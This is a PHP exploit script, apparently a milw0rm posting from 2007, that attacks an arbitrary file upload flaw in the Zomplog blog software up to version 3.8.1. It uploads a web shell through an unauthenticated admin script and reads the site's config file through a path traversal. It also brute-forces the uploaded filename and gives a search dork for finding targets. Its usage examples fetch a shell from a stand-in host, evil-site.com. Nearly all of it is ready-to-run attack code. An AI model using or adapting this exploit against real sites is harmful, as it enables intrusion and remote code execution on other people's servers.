<html><head><title>Zomplog <= 3.8.1 upload_files.php Arbitrary File Upload Exploit</title></head><pre>&lt;?php
## Zomplog &lt;= 3.8.1 Arbitrary File Upload Exploit
## by InATeam (http://inattack.ru/)
## tested on versions 3.8.1 with security patch, 3.8.1, 3.8, 3.7.5

echo &quot;------------------------------------------------------------\n&quot;;
echo &quot;Zomplog &lt;= 3.8.1 Arbitrary File Upload Exploit\n&quot;;
echo &quot;(c)oded by Raz0r, InATeam (http://inattack.ru/)\n&quot;;
echo &quot;dork: \&quot;Powered by Zomplog\&quot;\n&quot;;
echo &quot;------------------------------------------------------------\n&quot;;

if ($argc&lt;3) {
echo &quot;USAGE:\n&quot;;
echo &quot;~~~~~~\n&quot;;
echo &quot;php {$argv[0]} [url] [file]\n\n&quot;;
echo &quot;[url]  - target server where Zomplog is installed\n&quot;;
echo &quot;[file] - file to upload (local or remote)\n\n&quot;;
echo &quot;examples:\n&quot;;
echo &quot;php {$argv[0]} http://site.com/ http://evil-site.com/sh.php\n&quot;;
echo &quot;php {$argv[0]} http://weblog.site.com:8080/ /root/sh.php\n&quot;;
echo &quot;php {$argv[0]} http://site.com/zomplog/ sh.php\n&quot;;
die;
}
/**
* software site: http://zomplog.zomp.nl/
*
* i) /admin/upload_files.php is supposed to be run only from admin panel
* (it is included in /admin/editor.php, other admin scripts) but unathorized
* users can call it directly, because the script doesnt check if you are admin
* ii) /admin/upload_files.php allows to upload any files: it checks only
* MIME-types of the files but not the extensions. For example, it is possible
* to upload php script and then execute it
* iii) uploaded file will be moved to /upload directory and its name will
* have the format like this:
* [YearMonthDay]_[RandomNumberFrom1To999]_[OriginalFilename]
* In the version 3.8.1 additional prefix is used. By default /upload is not
* protected by .htaccess, so we can get the contents of it.
* However sometimes directory listing is denied and in this case we need to
* brute the filename (max number of requests is 999)
*/
error_reporting(0);
set_time_limit(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,10);
$url = $argv[1];
$file = $argv[2];
$url_parts = parse_url($url);
$host = $url_parts['host'];
$path = $url_parts['path'];
if (isset($url_parts['port'])) $port = $url_parts['port']; else $port = 80;
$filename = basename($file);
echo &quot;[~] Getting $filename... &quot;;
$fp = file_get_contents($file);
$fp ? print(&quot;OK\n&quot;) : die(&quot;failed\n&quot;);
$data = &quot;--------bndry31337\r\n&quot;;
$data.= &quot;Content-Disposition: form-data; &quot;;
$data.= &quot;name=\&quot;file\&quot;; filename=\&quot;{$filename}\&quot;\r\n&quot;;
$data.= &quot;Content-Type: text/plain\r\n\r\n&quot;;
$data.= $fp.&quot;\r\n&quot;;
$data.= &quot;--------bndry31337\r\n&quot;;
$packet = &quot;POST {$path}admin/upload_files.php HTTP/1.0\r\n&quot;;
$packet.= &quot;Host: {$host}\r\n&quot;;
$packet.= &quot;User-Agent: InAttack evil agent\r\n&quot;;
$packet.= &quot;Content-Type: multipart/form-data; boundary=------bndry31337\r\n&quot;;
$packet.= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.= &quot;Connection: close\r\n\r\n&quot;;
$packet.= $data;
echo &quot;[~] Uploading {$filename}... &quot;;
$resp = send($packet);
$exploded = explode(&quot;\r\n&quot;,$resp);
$errno=array();
preg_match('@(\d{3})@',$exploded[0],$errno);
if ($errno[1]!=200) $resp = false;
$resp ? print(&quot;OK\n&quot;) : die(&quot;failed\n&quot;);
$packet = &quot;GET {$path}upload/ HTTP/1.0\r\n&quot;;
$packet.= &quot;Host: {$host}\r\n&quot;;
$packet.= &quot;User-Agent: InAttack evil agent\r\n&quot;;
$packet.= &quot;Connection: close\r\n\r\n&quot;;
$resp = send($packet);
if (strpos($resp, &quot;force_download.php&quot;) !== false) {
   echo &quot;[+] Directory listing of {$path}upload/ is allowed\n&quot;;
   $matches=array();
   if (preg_match('/(temp_)*\d{8}_\d{1,3}_'.$filename.'/',$resp,$matches)){
       $newname = $matches[0];
       echo &quot;[+] Filename is $newname\n&quot;;
       echo &quot;[+] {$url}upload/{$newname}\n&quot;;
   }
   else die(&quot;[-] Exploit failed\n&quot;);
}
else {
   echo &quot;[-] Directory listing of {$path}upload/ is denied\n&quot;;
   //it is necessary to determine if prefix 'temp_' is used before the filename
   echo &quot;[~] Getting Zomplog's version... &quot;;
   $packet = &quot;GET {$path}upload/force_download.php?file=../admin/config.php HTTP/1.0\r\n&quot;;
   //thx to Dj7xpl for this bug =)
   $packet.= &quot;Host: {$host}\r\n&quot;;
   $packet.= &quot;User-Agent: InAttack evil agent\r\n&quot;;
   $packet.= &quot;Connection: close\r\n\r\n&quot;;
   $resp = send($packet);
   $matches=array();
   if (preg_match('@\$version = &quot;([^&quot;]+)&quot;;@',$resp,$matches)) {
       echo $matches[1].&quot;\n&quot;;
       $prefix = (&quot;3.8.1&quot; == $matches[1]) ? 'temp_' : '';
   }
   else {
       echo &quot;3.8.1 with sec patch\n&quot;;
       $prefix = &quot;temp_&quot;;       }
   echo &quot;    Bruting the filename...&quot;;
   for($i=1;$i&lt;1000;$i++) {
       $packet = &quot;GET {$path}upload/&quot;.$prefix.date(&quot;Ymd&quot;).&quot;_&quot;.$i.&quot;_&quot;;
       $packet.= urlencode($filename).&quot; HTTP/1.0\r\n&quot;;
       $packet.= &quot;Host: {$host}\r\n&quot;;
       $packet.= &quot;User-Agent: InAttack evil agent\r\n&quot;;
       $packet.= &quot;Connection: close\r\n\r\n&quot;;
       $resp = send($packet);
       status();
       $exploded = explode(&quot;\r\n&quot;,$resp);
       $errno=array();
       preg_match('@(\d{3})@',$exploded[0],$errno);
       if ($errno[1]==200) {
           $newname = $prefix.date(&quot;Ymd&quot;).&quot;_&quot;.$i.&quot;_&quot;.$filename;
           echo &quot;[+] Filename is {$newname}\n&quot;;
           echo &quot;[+] {$url}upload/{$newname}\n&quot;;
           die;
       }
   }
   printf(&quot;[-] Exploit failed%9s\n&quot;,'');
}
function send($packet) {
   global $host,$port;
   $ock = fsockopen(gethostbyname($host),$port);
   if (!$ock) return false;
   else {
       fputs($ock, $packet);
       $html='';
       while (!feof($ock)) $html.=fgets($ock);
   }
   return $html;
}
function status() {
   static $n;
   $n++;
   if ($n &gt; 3) $n = 0;
   if($n==0){ print &quot;\r[-]\r&quot;;  }
   if($n==1){ print &quot;\r[\\]\r&quot;;  }
   if($n==2){ print &quot;\r[|]\r&quot;;  }
   if($n==3){ print &quot;\r[/]\r&quot;; }
}
?&gt;

# milw0rm.com [2007-09-28]</pre></html>